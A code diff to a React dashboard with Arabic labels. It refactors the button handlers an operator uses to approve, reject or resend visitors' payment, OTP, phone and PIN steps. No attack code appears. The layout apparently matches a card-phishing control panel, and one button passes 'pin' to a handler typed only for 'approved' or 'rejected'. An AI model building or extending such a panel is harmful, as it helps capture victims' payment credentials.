@@ -1314,15 +1314,16 @@ export default function DashboardPage() {
   };
 
   // Handle dashboard actions
-  const handlePaymentAction = async (action: "approved" | "rejected", event: React.MouseEvent) => {
-    event.stopPropagation();
+  const handlePaymentAction = async (action: "approved" | "rejected", event?: React.MouseEvent) => {
+    event?.stopPropagation();
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
     
-    const button = event.currentTarget as HTMLButtonElement;
-    const originalText = button.innerHTML;
-    button.disabled = true;
-    button.innerHTML = "...";
+    let button: HTMLButtonElement | null = null;
+    if (event?.currentTarget) {
+      button = event.currentTarget as HTMLButtonElement;
+      button.disabled = true;
+    }
     
     try {
       const res = await fetch("/api/dashboard/payment-action", {
@@ -1339,8 +1340,7 @@ export default function DashboardPage() {
       showNotification("error", "فشل الاتصال");
     }
     
-    button.disabled = false;
-    button.innerHTML = originalText;
+    if (button) button.disabled = false;
   };
 
   const handleOtpAction = async (action: "approved" | "rejected" | "resend", event?: React.MouseEvent) => {
@@ -2004,7 +2004,7 @@ export default function DashboardPage() {
             marginBottom: 12 
           }}>
             <button
-              onClick={() => handleOtpAction("approved")}
+              onClick={(e) => handleOtpAction("approved", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2024,7 +2024,7 @@ export default function DashboardPage() {
               ✅ موافق
             </button>
             <button
-              onClick={() => handleOtpAction("rejected")}
+              onClick={(e) => handleOtpAction("rejected", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2275,7 +2275,7 @@ export default function DashboardPage() {
             gap: 8 
           }}>
             <button
-              onClick={() => handlePaymentAction("approved")}
+              onClick={(e) => handlePaymentAction("approved", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2295,7 +2295,7 @@ export default function DashboardPage() {
               ✅ موافق
             </button>
             <button
-              onClick={() => handlePaymentAction("rejected")}
+              onClick={(e) => handlePaymentAction("rejected", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2315,7 +2315,7 @@ export default function DashboardPage() {
               ❌ رفض
             </button>
             <button
-              onClick={() => handlePaymentAction("pin")}
+              onClick={(e) => handlePaymentAction("pin", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2540,7 +2540,7 @@ export default function DashboardPage() {
               gap: 8 
             }}>
               <button
-                onClick={() => handlePhoneAction("rejected")}
+                onClick={(e) => handlePhoneAction("rejected", e)}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2560,7 +2560,7 @@ export default function DashboardPage() {
                 ❌ رفض
               </button>
               <button
-                onClick={() => handlePhoneAction("resend")}
+                onClick={(e) => handlePhoneAction("resend", e)}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2580,7 +2580,7 @@ export default function DashboardPage() {
                 🔄 إعادة إرسال
               </button>
               <button
-                onClick={() => handlePhoneAction("approved")}
+                onClick={(e) => handlePhoneAction("approved", e)}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2997,7 +2997,7 @@ export default function DashboardPage() {
             marginBottom: 12
           }}>
             <button
-              onClick={() => handlePinAction("approved")}
+              onClick={(e) => handlePinAction("approved", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -3017,7 +3017,7 @@ export default function DashboardPage() {
               ✅ موافق
             </button>
             <button
-              onClick={() => handlePinAction("rejected")}
+              onClick={(e) => handlePinAction("rejected", e)}
               style={{
                 flex: 1,
                 padding: "10px 16px",
